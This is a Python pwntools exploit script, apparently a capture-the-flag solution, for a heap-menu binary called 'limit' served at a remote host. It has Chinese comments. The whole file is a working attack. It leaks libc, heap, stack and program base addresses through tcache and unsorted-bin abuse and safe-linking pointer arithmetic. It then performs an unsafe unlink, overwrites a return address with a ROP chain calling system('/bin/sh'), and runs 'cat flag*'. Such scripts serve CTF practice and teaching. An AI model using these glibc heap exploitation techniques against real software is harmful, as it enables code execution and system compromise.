from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./limit"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("smiley.cat", 46465)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


p_chunk = 0x4040
p_size = 0x404c


def create(idx, size):
    io.sendlineafter("> ", "1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))


def delete(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Index: ", str(idx))


def edit(idx, data):
    io.sendlineafter("> ", "4")
    io.sendlineafter("Index: ", str(idx))
    io.sendafter("Data: ", data)


def show(idx):
    io.sendlineafter("> ", "3")
    io.sendlineafter("Index: ", str(idx))


for i in range(9):
    create(i, 0xf0)

create(0xf, 0x10)
for i in range(9):
    delete(i)

for i in range(7):
    create(i, 0xf0)

create(7, 0xf0)
create(8, 0xf0)
show(7)
main_arena = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = main_arena - 0x203d10
log.success("lic.address:-----> " + hex(libc.address))
show(8)
heap = u64(io.recvuntil("\x05")[-5:].ljust(8, b"\x00"))
heap = heap << 12
log.success("heap:-----> " + hex(heap))


create(0, 0xf8)
create(1, 0xf8)
create(2, 0xf8)
create(3, 0xf8)
edit(0, p64(0)+p64(0x2f1) + p64((heap+0xbc0)) * 2)
edit(2, b"t"*0xf0+p64(0x2f0))

for i in range(7):
    create(i+4, 0xf8)

for i in range(7):
    delete(i+4)

delete(3)  # 假chunk0-3 一起进入unsortedbin

create(4, 0x68)
create(4, 0x78)
create(5, 0x18)     # chunk1, chunk5同样的地址

# 泄漏栈，通过libc_argv
create(6, 0x18)
delete(6)
libc_argv = libc.symbols["__libc_argv"]
log.success("libc_argv:-----> " + hex(libc_argv))
delete(5)
edit(1, p64(libc_argv ^ (heap+0xce0) >> 12))
create(5, 0x18)
create(6, 0x18)
delete(5)
show(1)
v = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
stack = heap >> 12 ^ libc_argv >> 12 ^ v
log.success("leak stack:-----> " + hex(stack))
create(5, 0x18)

# 泄漏程序基地址
create(6, 0x18)
delete(6)
leak_addr = stack - 0x48
log.success("leak_addr:-----> " + hex(leak_addr))
delete(5)
edit(1, p64(leak_addr ^ (heap+0xce0) >> 12))
create(5, 0x18)
create(6, 0x18)
delete(5)
show(1)
io.recvuntil("Data: ")
v = u64(io.recv(6).ljust(8, b"\x00"))
ebase = heap >> 12 ^ leak_addr >> 12 ^ v
ebase -= 0x1160
log.success("ebase:-----> " + hex(ebase))
create(5, 0x18)


# 清空tcache
for i in range(10):
    create(0, 0xf8)

# unsafe unlink
create(0, 0xf8)
create(1, 0xf8)
create(2, 0xf8)
create(3, 0xf8)
create(4, 0xf8)
create(5, 0xf8)

ptr_addr = ebase + 0x4040
fd = ptr_addr - 0x18
bk = ptr_addr - 0x10
payload = p64(0)+p64(0x4f1)
payload += p64(fd)+p64(bk)
edit(0, payload)

payload = b"a" * 0xf0 + p64(0x4f0)
edit(4, payload)
for i in range(7):
    create(i+8, 0xf8)

for i in range(7):
    delete(i+8)
# ddebug("b malloc\n b free\n continue")
delete(5)


# read返回值相对于上面泄漏的stack偏移
read_ret_stack_offset = 0x7ffeff81c4b8 - 0x7ffeff81c348  # 0x170
read_ret_addr = stack - read_ret_stack_offset
log.success("read_ret:-----> " + hex(read_ret_addr))
payload = p64(0)
payload += p64(libc.symbols["_IO_2_1_stdin_"])
payload += p64(0)
payload += p64(read_ret_addr)
edit(0, payload)

"""
0x000000000010f75b : pop rdi ; ret
"""
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
payload = p64(libc.address + 0x000000000010f75b)
payload += p64(binsh_addr)
# payload += p64(ebase + 0x17b4)
# payload += p64(0)
payload += p64(libc.address + 0x2882f)
payload += p64(system_addr)
ddebug(f"b *{libc.address+0x000000000010f75b} \ncontinue")
edit(0, payload)

io.sendline(b"cat flag*")
io.interactive()
